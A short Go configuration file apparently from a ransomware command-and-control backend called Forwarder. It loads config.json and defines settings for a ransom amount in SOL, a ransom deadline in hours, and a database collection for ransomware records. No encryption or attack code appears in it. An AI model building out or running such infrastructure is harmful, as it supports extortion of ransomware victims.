package types

import (
	"encoding/json"
	"log"
	"os"
	"time"

	"github.com/Aran404/Forwarder/api/database"
)

var (
	Config ConfigVars
)

func init() {
	cfg, err := os.Open("config.json")
	if err != nil {
		log.Fatal(err)
	}

	defer cfg.Close()
	if err := json.NewDecoder(cfg).Decode(&Config); err != nil {
		log.Fatal(err)
	}

	database.ConnectionURI = Config.Database.ConnectionURI
	database.DatabaseName = Config.Database.DatabaseName
	database.ConnectionTimeout = time.Duration(Config.Database.ConnectionTimeoutSeconds) * time.Second
}

type ConfigVars struct {
	C2 struct {
		RansomAmountSOL     float64 `json:"ransom_amount_sol"`
		RansomDeadlineHours int     `json:"ransom_deadline_hours"`
	} `json:"c2"`
	Database struct {
		ConnectionURI            string `json:"connection_uri"`
		DatabaseName             string `json:"database_name"`
		CollectionRansomware     string `json:"collection_ransomware"`
		ConnectionTimeoutSeconds int    `json:"connection_timeout_seconds"`
	} `json:"database"`
}
